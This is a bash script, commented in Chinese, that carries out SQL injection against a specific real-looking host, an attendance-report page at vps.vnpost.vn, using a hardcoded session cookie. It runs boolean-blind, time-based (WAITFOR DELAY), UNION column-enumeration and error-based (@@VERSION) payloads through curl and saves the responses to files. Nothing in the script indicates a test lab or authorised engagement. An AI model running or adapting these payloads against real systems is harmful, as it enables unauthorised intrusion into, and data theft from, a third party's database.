#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE_URL="http://vps.vnpost.vn/chamcong/report/inBCC.aspx"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 Chamcong SQL注入完整测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试1: ID参数布尔盲注
echo -e "\n[测试1] ID参数 - 布尔盲注"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 基线请求
baseline=$(curl -sk "${BASE_URL}?ID=MAU2" -H "Cookie: $COOKIE" 2>&1 | wc -c)
echo "基线长度: $baseline bytes"

# 测试 AND 1=1 (应该相同)
test1=$(curl -sk "${BASE_URL}?ID=MAU2' AND 1=1--" -H "Cookie: $COOKIE" 2>&1 | wc -c)
echo "ID=MAU2' AND 1=1--: $test1 bytes"

# 测试 AND 1=2 (应该不同)
test2=$(curl -sk "${BASE_URL}?ID=MAU2' AND 1=2--" -H "Cookie: $COOKIE" 2>&1 | wc -c)
echo "ID=MAU2' AND 1=2--: $test2 bytes"

if [ "$test1" -eq "$baseline" ] && [ "$test2" -ne "$baseline" ]; then
    echo "✅ [可能存在SQL注入!] 布尔盲注特征明显"
else
    echo "⚠️  布尔盲注特征不明显"
fi

# 测试2: 时间盲注
echo -e "\n[测试2] ID参数 - 时间盲注"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo -n "正常请求耗时: "
time_normal=$(time -p curl -sk "${BASE_URL}?ID=MAU2" -H "Cookie: $COOKIE" -o /dev/null 2>&1 | grep real | awk '{print $2}')
echo "${time_normal}s"

echo -n "延时5秒请求: "
time_delay=$(time -p curl -sk "${BASE_URL}?ID=MAU2'; WAITFOR DELAY '0:0:5'--" -H "Cookie: $COOKIE" -o /dev/null 2>&1 | grep real | awk '{print $2}')
echo "${time_delay}s"

if (( $(echo "$time_delay > $time_normal + 4" | bc -l) )); then
    echo "✅ [SQL注入确认!] 时间盲注成功 (延时明显)"
else
    echo "⚠️  时间盲注未确认"
fi

# 测试3: UNION注入
echo -e "\n[测试3] ID参数 - UNION注入"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

for cols in {1..10}; do
    nulls=$(printf "NULL,%.0s" $(seq 1 $cols) | sed 's/,$//')
    response=$(curl -sk "${BASE_URL}?ID=MAU2' UNION SELECT ${nulls}--" -H "Cookie: $COOKIE" 2>&1)
    
    if echo "$response" | grep -qiE "error|exception|syntax"; then
        echo "列数 $cols: ❌ 错误"
    else
        echo "列数 $cols: ✅ 可能正确"
        echo "$response" | head -20 > "union_${cols}_cols.html"
    fi
done

# 测试4: 错误注入
echo -e "\n[测试4] ID参数 - 错误注入"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE_URL}?ID=MAU2' AND 1=CONVERT(INT,@@VERSION)--" \
    -H "Cookie: $COOKIE" -o error_version.html 2>&1

if grep -qi "sql\|convert\|syntax" error_version.html; then
    echo "✅ 发现SQL错误信息"
    grep -i "sql\|convert\|microsoft" error_version.html | head -5
else
    echo "⚠️  无明显SQL错误"
fi

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "测试完成 - 查看结果文件"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
